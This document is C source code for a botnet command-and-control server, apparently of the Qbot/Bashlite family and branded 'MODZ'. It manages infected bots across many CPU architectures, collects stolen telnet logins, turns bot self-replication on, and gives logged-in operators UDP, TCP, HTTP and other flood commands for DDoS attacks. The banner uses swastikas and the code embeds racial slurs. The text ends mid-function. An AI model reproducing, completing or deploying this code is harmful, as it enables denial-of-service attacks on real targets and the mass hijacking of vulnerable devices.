/*
███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║   ██║██║  ██║  ███╔╝ 
██║╚██╔╝██║██║   ██║██║  ██║ ███╔╝  
██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝

If you have this you are trusted. Please do not leak!
MODZ SERVER SIDE V1 By DaddyL33T

Current Owner Count - 2
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#define MAXFDS 1000000
//////////////////////////////////
struct login_info {
	char username[20];
	char password[20];
};
static struct login_info accounts[22];
/*mips x86 ppc m68k spc arm sh4*/
struct clientdata_t {
        uint32_t ip;
		char connected;
		char mips;
		char x86;
		char ppc;
		char m68k;
		char spc;
		char arm;
		char sh4;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
struct args {
        int sock;
        struct sockaddr_in cli_addr;
};
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
static volatile int dups = 0;
int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC; 
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		exit (EXIT_FAILURE);
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	char memnig[BUFSIZ]; 
	char build[BUFSIZ];
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						dups++;
						break;
					}}
				if(dup) {
					if(send(infd, "!* KILLME\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
				send(infd, "!* NIGGERKILL\n", 15, MSG_NOSIGNAL);
				send(infd, "!* TELSCAN ON\n", 15, MSG_NOSIGNAL);
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "MIPS") == buf) {
						char *line = strstr(buf, "MIPS");
						client->mips = 1;
						continue;
					}
					if(strstr(buf, "MIPSEL") == buf) {
						char *line = strstr(buf, "MIPSEL");
						client->mips = 1;
						continue;
					}
					if(strstr(buf, "SH4") == buf) {
						char *line = strstr(buf, "SH4");
						client->sh4 = 1;
						continue;
					}
					if(strstr(buf, "x86_64") == buf) {
						char *line = strstr(buf, "x86_64");
						client->x86 = 1;
						continue;
					}
					if(strstr(buf, "i586") == buf) {
						char *line = strstr(buf, "i586");
						client->x86 = 1;
						continue;
					}
					if(strstr(buf, "i686") == buf) {
						char *line = strstr(buf, "i686");
						client->x86 = 1;
						continue;
					}
					if(strstr(buf, "PPC") == buf) {
						char *line = strstr(buf, "PPC");
						client->ppc = 1;
						continue;
					}
					if(strstr(buf, "m68k") == buf) {
						char *line = strstr(buf, "m68k");
						client->m68k = 1;
						continue;
					}
					if(strstr(buf, "sparc") == buf) {
						char *line = strstr(buf, "sparc");
						client->spc = 1;
						continue;
					}
					if(strstr(buf, "ARMv4") == buf) {
						char *line = strstr(buf, "ARMv4");
						client->arm = 1;
						continue;
					}
					if(strstr(buf, "ARMv5") == buf) {
						char *line = strstr(buf, "ARMv5");
						client->arm = 1;
						continue;
					}
					if(strstr(buf, "ARMv6") == buf) {
						char *line = strstr(buf, "ARMv6");
						client->arm = 1;
						continue;
					}
					if(strstr(buf, "TELNET ") == buf) {
						char *line = strstr(buf, "TELNET ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				/*mips x86 ppc m68k spc arm sh4*/
				client->connected = 0;
				client->mips = 0;
				client->x86 = 0;
				client->ppc = 0;
				client->m68k = 0;
				client->spc = 0;
				client->arm = 0;
				client->sh4 = 0;
				close(datafd);
					}
				}
			}
		}
	}
}/*mips x86 ppc m68k spc arm sh4*/
unsigned int mips() {
	int i = 0, mips = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].mips)
	    {
			continue;
		}
		mips++;
	}
	return mips;
}
unsigned int x86() {
	int i = 0, x86 = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].x86)
	    {
			continue;
		}
		x86++;
	}
	return x86;
}
unsigned int arm() {
	int i = 0, arm = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].arm)
	    {
			continue;
		}
		arm++;
	}
	return arm;
}
unsigned int ppc() {
	int i = 0, ppc = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].ppc) continue;
		ppc++;
	}
	return ppc;
}
unsigned int m68k() {
	int i = 0, m68k = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].m68k) continue;
		m68k++;
	}
	return m68k;
}
unsigned int spc() {
	int i = 0, spc = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].spc) continue;
		spc++;
	}
	return spc;
}
unsigned int sh4() {
	int i = 0, sh4 = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].sh4) continue;
		sh4++;
	}
	return sh4;
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
		sprintf(string, "%c]0; [+] Bots: %d [-] Operators: %d [+]%c", '\033', BotsConnected(), OperatorsConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return NULL;
 
                sleep(3);
        }
}
int file_exist(char *filename)
{
  struct stat buffer;   
  return (stat(filename, &buffer) == 0);
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("MODZ.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
void client_addr(struct sockaddr_in addr){
        printf("%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("Connections.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}
void *telnetWorker(void *sock)
{
		char usernamez[80];
        int thefd = (int)sock;
		int find_line;
        OperatorsConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
		memset(botnet, 0, 2048);
		char botnet1[2048];
		memset(botnet1, 0, 2048);
		char botnet2[2048];
		memset(botnet2, 0, 2048);
		char botnet3[2048];
		memset(botnet3, 0, 2048);
		char botnet4[2048];
		memset(botnet4, 0, 2048);
		char botnet5[2048];
		memset(botnet5, 0, 2048);
		char botnet6[2048];
		memset(botnet6, 0, 2048);
		char botnet7[2048];
		memset(botnet7, 0, 2048);
		char botnet8[2048];
		memset(botnet8, 0, 2048);
		char botnet9[2048];
		memset(botnet9, 0, 2048);
		char botnet10[2048];
		memset(botnet10, 0, 2048);
		
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("MODZ.txt", "r"); 
        while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
			++j;
        }
        
        if(send(thefd, "\x1b[35mName:\x1b[33m ", 16, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){					
        if(send(thefd, "\x1b[35mPasscode:\x1b[30m ", 20, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto dope;
        }
        failed:
        if(send(thefd, "\033[1A", 6, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[0;37m***********************************\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[0;37m*  Incorrect Credentials!         *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[0;37m*    This has been logged         *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[0;37m***********************************\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
		    sleep(5);
        goto end;
		dope:
		pthread_create(&title, NULL, &titleWriter, sock);
		char dope1 [80];
		char dope2 [80];
		char dope3 [80];
		char dope4 [80];
		char dope5 [80];
		char dope6 [80];
		sprintf(dope1, "\x1b[0;37m[+] Loading The Net [+]\r\n");
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, dope1, strlen(dope1), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		goto fak;
		
        fak:
		
		pthread_create(&title, NULL, &titleWriter, sock);
		char line1 [999];
		char line2 [999];
		char line3 [999];
		char line4 [999];
		char line5 [999];
		char line6 [999];
		char line7 [999];
        char line8 [999];
		char line9 [999];
		char line10 [999];
		/*
███╗   ███╗ ██████╗ ██████╗ ███████╗
████╗ ████║██╔═══██╗██╔══██╗╚══███╔╝
██╔████╔██║██║   ██║██║  ██║  ███╔╝ 
██║╚██╔╝██║██║   ██║██║  ██║ ███╔╝  
██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
		*/
        sprintf(line1, "\x1b[0;31m███\x1b[1;31m╗   \x1b[0;31m███\x1b[1;31m╗ \x1b[0;31m██████\x1b[1;31m╗ \x1b[0;31m██████\x1b[1;31m╗ \x1b[0;31m███████\x1b[1;31m╗\r\n");
		sprintf(line2, "\x1b[0;31m████\x1b[1;31m╗ \x1b[0;31m████\x1b[1;31m║\x1b[0;31m██\x1b[1;31m╔═══\x1b[0;31m██\x1b[1;31m╗\x1b[0;31m██\x1b[1;31m╔══\x1b[0;31m██\x1b[1;31m╗╚══\x1b[0;31m███\x1b[1;31m╔╝\r\n");
		sprintf(line3, "\x1b[0;31m██\x1b[1;31m╔\x1b[0;31m████\x1b[1;31m╔\x1b[0;31m██\x1b[1;31m║\x1b[0;31m██\x1b[1;31m║   \x1b[0;31m██\x1b[1;31m║\x1b[0;31m██\x1b[1;31m║  \x1b[0;31m██\x1b[1;31m║  \x1b[0;31m███\x1b[1;31m╔╝ \r\n");
		sprintf(line4, "\x1b[0;31m██\x1b[1;31m║╚\x1b[0;31m██\x1b[1;31m╔╝\x1b[0;31m██\x1b[1;31m║\x1b[0;31m██\x1b[1;31m║   \x1b[0;31m██\x1b[1;31m║\x1b[0;31m██\x1b[1;31m║  \x1b[0;31m██\x1b[1;31m║ \x1b[0;31m███\x1b[1;31m╔╝  \r\n");
		sprintf(line5, "\x1b[0;31m██\x1b[1;31m║ ╚═╝ \x1b[0;31m██\x1b[1;31m║╚\x1b[0;31m██████\x1b[1;31m╔╝\x1b[0;31m██████\x1b[1;31m╔╝\x1b[0;31m███████\x1b[1;31m╗\r\n");
		sprintf(line6, "\x1b[1;31m╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝\r\n");
		sprintf(line7, "\x1b[0;36m卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐\r\n");
        sprintf(line8, "\r\n  \x1b[0m[!]\x1b[0;31m Welcome \x1b[0;35m %s\x1b[0;31m To HELL \x1b[0m[!]", accounts[find_line].username, buf);
		sprintf(line9, "\r\n  \x1b[0m[!]\x1b[0;31m Type HELP to see commands \x1b[0m[!]\x1b[0m\r\n");
		sprintf(line10, "\r\n\x1b[0;36m卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐\r\n\r\n");
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8, strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line9, strlen(line9), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line10, strlen(line10), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[1;31m~> \x1b[36m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
		managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
		if(strstr(buf, "BOTCOUNT"))
		{
			sprintf(botnet, " MIPS [%d]\r\n", mips());
			sprintf(botnet1, " x86 [%d]\r\n", x86());
			sprintf(botnet2, " PPC [%d]\r\n", ppc());
			sprintf(botnet3, " M68K [%d]\r\n", m68k());
			sprintf(botnet4, " SPC [%d]\r\n", spc());
			sprintf(botnet5, " ARM [%d]\r\n", arm());
			sprintf(botnet6, " SH4 [%d]\r\n", sh4());
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet1, strlen(botnet1), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet2, strlen(botnet2), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet3, strlen(botnet3), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet4, strlen(botnet4), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet5, strlen(botnet5), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet6, strlen(botnet6), MSG_NOSIGNAL) == -1) return NULL;

		}
		if(strstr(buf, "BOTS"))
		{
			sprintf(botnet, " Bots [%d]\r\n", BotsConnected());
			sprintf(botnet1, " Dups Deleted [%d]\r\n", dups);
			sprintf(botnet2, " Telnet logins [%d]\r\n", TELFound);
			sprintf(botnet3, " Operators [%d]\r\n", OperatorsConnected);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet1, strlen(botnet1), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet2, strlen(botnet2), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet3, strlen(botnet3), MSG_NOSIGNAL) == -1) return NULL;

		}
		if(strstr(buf, "STATUS"))
		{
			sprintf(botnet, " Bots [%d]\r\n", BotsConnected());
			sprintf(botnet1, " Dups Deleted [%d]\r\n", dups);
			sprintf(botnet2, " Telnet logins [%d]\r\n", TELFound);
			sprintf(botnet3, " Operators [%d]\r\n", OperatorsConnected);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet1, strlen(botnet1), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet2, strlen(botnet2), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet3, strlen(botnet3), MSG_NOSIGNAL) == -1) return NULL;

		}
        if(strstr(buf, "bots"))
		{
			sprintf(botnet, " Bots [%d]\r\n", BotsConnected());
			sprintf(botnet1, " Dups Deleted [%d]\r\n", dups);
			sprintf(botnet2, " Telnet logins [%d]\r\n", TELFound);
			sprintf(botnet3, " Operators [%d]\r\n", OperatorsConnected);
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet1, strlen(botnet1), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet2, strlen(botnet2), MSG_NOSIGNAL) == -1) return NULL;
			if(send(thefd, botnet3, strlen(botnet3), MSG_NOSIGNAL) == -1) return NULL;

		}
	    if(strstr(buf, "TIME"))
		{  
    	sprintf(botnet, " you go past 3600 seconds and your ass is fried \r\n");
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
		}
	    if(strstr(buf, "RULES"))
		{  
		sprintf(botnet, " Please Read The Following Rules if not will result in ban\r\n 1.) DO NOT SHARE YOUR ACCOUNT INFO \r\n 2.) DO NOT SPAM THE NET\r\n 3.) Dont hit any goverment websites\r\n");
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
	    if(strstr(buf, "PORTS"))
		{  
		sprintf(botnet, " Console~3074 NFO~1094/443 Hotspot~USE A TOOL FOR THEIR PORT\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
		if(strstr(buf, "!* NIGGERKILL"))
		{  
		sprintf(botnet, " Those Boatz Got Killd\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
		}
		if(strstr(buf, "!* TELSCAN OFF"))
		{  
		sprintf(botnet, " TELNET SELF REPLIFICATION OFF\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
		}
		if(strstr(buf, "!* TELSCAN ON"))
		{  
		sprintf(botnet, " TELNET SELF REPLIFICATION ON\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
		}
		if(strstr(buf, "!* PHONESCAN ON"))
		{  
		sprintf(botnet, " PHONE SELF REPLIFICATION ON\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
		}
		if(strstr(buf, "!* PHONESCAN OFF"))
		{  
		sprintf(botnet, " PHONE SELF REPLIFICATION OFF\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
		}
		if(strstr(buf, "!* TCP"))
		{  
		sprintf(botnet, " WOOPS DADDY JUST DROPPED THAT SHIT [TCP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
		if(strstr(buf, "!* UDP"))
		{  
		sprintf(botnet, " WOOPS DADDY JUST DROPPED THAT SHIT [UDP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
		if(strstr(buf, "!* STD"))
		{  
		sprintf(botnet, " WOOPS DADDY JUST DROPPED THAT SHIT [STD]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
		if(strstr(buf, "!* CNC"))
		{  
		sprintf(botnet, " WOOPS DADDY JUST DROPPED THAT SHIT [CNC]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
        if(strstr(buf, "!* HOLD"))
		{  
		sprintf(botnet, " WOOPS DADDY JUST DROPPED THAT SHIT [HOLD]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
        if(strstr(buf, "!* JUNK"))
		{  
		sprintf(botnet, " WOOPS DADDY JUST DROPPED THAT SHIT [JUNK]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
		if(strstr(buf, "!* STOPATTK"))
		{  
		sprintf(botnet, " SUCCESSFULLY STOPPED ATTACK\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
		if(strstr(buf, "INFO"))
		{  
		sprintf(botnet, " This server side is on Version 1. \r\n Msg ghost.rootmodz if you want to buy the client/server/scanner/cc\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
		}
		if(strstr(buf, "!* HTTP"))
		{  
		sprintf(botnet, " WOOPS DADDY JUST DROPPED THAT SHIT [HTTP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
	    if(strstr(buf, "ports"))
		{  
		sprintf(botnet, " Console~3074 NFO~1094 Hotspot~USE A TOOL FOR THEIR PORT\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return NULL;
        }
			if(strstr(buf, "HELP")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char helpline1  [80];
				char helpline2  [80];
				char helpline3  [80];
				char helpline4  [80];

				sprintf(helpline1,  "\x1b[0;31mType An Option:\r\n");
				sprintf(helpline2,  "\x1b[1;37m[\x1b[35mDDOS\x1b[1;37m] ~ Shows all commands for DDoS Attacks\r\n");
				sprintf(helpline3,  "\x1b[1;37m[\x1b[34mEXTRA\x1b[1;37m] ~ Shows a list of all extra commands\r\n");
				if(send(thefd, helpline1,  strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline2,  strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, helpline3,  strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				if(send(thefd, "\x1b[1;31m~> \x1b[36m", 13, MSG_NOSIGNAL) == -1) goto end;
				continue;
		}
			if(strstr(buf, "DDOS")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char ddosline1  [80];
				char ddosline2  [80];
				char ddosline3  [80];
				char ddosline4  [80];
				char ddosline5  [80];
				char ddosline6  [80];
				char ddosline7  [80];
				char ddosline8  [80];

				sprintf(ddosline1, "\x1b[31m !* UDP [IP] [PORT] [TIME] 32 1337 10 -------| UDP FLOOD\r\n");
				sprintf(ddosline2, "\x1b[35m !* TCP [IP] [PORT] [TIME] 32 all 1337 10 ---| TCP FLOOD\r\n");
				sprintf(ddosline3, "\x1b[31m !* HTTP [URL] G|H|P [PORT] / [TIME] 1337 ---| L7 FLOOD\r\n");
				sprintf(ddosline4, "\x1b[35m !* JUNK [IP] [PORT] [TIME] -----------------| JUNK FLOOD\r\n");
				sprintf(ddosline5, "\x1b[31m !* HOLD [IP] [PORT] [TIME] -----------------| HOLD\r\n");
				sprintf(ddosline6, "\x1b[35m !* STD [IP] [PORT] [TIME] ------------------| STD FLOOD\r\n");
				sprintf(ddosline7, "\x1b[31m !* CNC [IP] [PORT] [TIME] ------------------| CNC FLOOD\r\n");
				sprintf(ddosline8, "\x1b[35m !* STOPATTK --------------------------------| STOPS ALL ATTACKS\r\n");

				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline4,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline5,  strlen(ddosline5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline6,  strlen(ddosline6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline7,  strlen(ddosline7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(thefd, ddosline8,  strlen(ddosline8),	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &titleWriter, sock);
				if(send(thefd, "\x1b[1;31m~> \x1b[36m", 13, MSG_NOSIGNAL) == -1) goto end;
				continue;
			}
			if(strstr(buf, "EXTRA")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				char extraline1  [80];
				char extraline2  [80];
				char extraline3  [80];
				char extraline4  [80];
				char extraline5  [80];
				char extraline6  [80];

				sprintf(extraline1,  "\x1b[35m PORTS---| PORTS TO HIT WITH\r\n");
				sprintf(extraline2,  "\x1b[31m BOTS----| BOT COUNT\r\n");
				sprintf(extraline3,  "\x1b[35m CLEAR---| CLEARS SCREEN\r\n");
				sprintf(extraline4,  "\x1b[31m RULES---| SHOWS RULES\r\n");
				sprintf(extraline5,  "\x1b[35m TIME----| SHOWS MAX BOOT TIME\r\n");
				sprintf(extraline6,  "\x1b[31m INFO----| SHOWS INFO ABOUT THIS SERVERSusernameE\r\n");

				if(send(thefd, extraline1,  strlen(extraline1),	MSG_NOSIGNAL) == -1) goto end;
